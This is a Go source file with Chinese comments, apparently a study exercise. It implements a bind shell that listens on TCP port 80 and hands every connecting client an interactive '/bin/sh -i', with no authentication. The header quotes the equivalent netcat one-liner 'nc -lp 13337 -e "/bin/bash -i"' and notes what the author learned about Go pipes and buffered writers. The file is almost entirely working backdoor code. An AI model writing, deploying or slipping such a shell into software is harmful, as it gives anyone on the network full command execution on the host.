/*
 * 在服务器上开 shell 执行任意客户端命令
 *
 * 这个号称是 netcat 的安全巨洞：nc -lp 13337 -e "/bin/bash -i"（注意 nc 可能需要升级）
 * 用代码实现了，将此程序运行在服务器上，可以通过客户端执行任意的命令文本来实现在服务器上执行此任意的命令，而在客户端得到结果
 *
 * 使用：
 *   通过命令 `telnet <server_ip> <port>` 连接到服务，然后发送任意命令
 *
 * 学到：
 *   Flusher.Write 相当于重写了 io.Write, 从而得到执行，函数内再自定义 bufio.Writer 的使用方法
 *   `reader, writer := io.Pipe()` 任何写入 writer 中的数据会立即被 reader 读取
 *
 * 扩充：
 *   - 当前 mac 上查看 nc 的文档，明确写了 -l 和 -p 不可以连用，且没有 -e 参数，重新安装（升级）后可用
 *   - `nc -l 8080` 就是一个简单的回显服务端（-l：指定 listen 某一个端口）
 */
package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	lis, err := net.Listen("tcp", ":80") // <server_ip>:<port>
	if err != nil {
		log.Fatalln(err.Error())
	}

	for {
		conn, err := lis.Accept()
		if err != nil {
			log.Println(err.Error())
			return
		}

		// go handle(conn)
		go handle2(conn)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i") // 在服务端用 shell 执行命令，-i 交互式
	cmd.Stdin = conn                     // stdin 对接到客户端的输入
	cmd.Stdout = NewFlusher(conn)        // stdout 对接到客户端的输出
	if err := cmd.Run(); err != nil {    // 以上，就可以通过客户端 (telnet) 访问
		log.Fatalln(err.Error())
	}
}

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, nil
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}

	return count, nil
}

func handle2(conn net.Conn) {
	reader, writer := io.Pipe()          // 任何写进 writer 的数据都会直接被 reader 读取
	cmd := exec.Command("/bin/sh", "-i") // 在服务端用 shell 执行命令，-i 交互式
	cmd.Stdin = conn                     // stdin 对接到客户端的输入
	cmd.Stdout = writer                  //
	go io.Copy(conn, reader)             //
	if err := cmd.Run(); err != nil {    // 以上，就可以通过客户端 (telnet) 访问
		log.Fatalln(err.Error())
	}
}
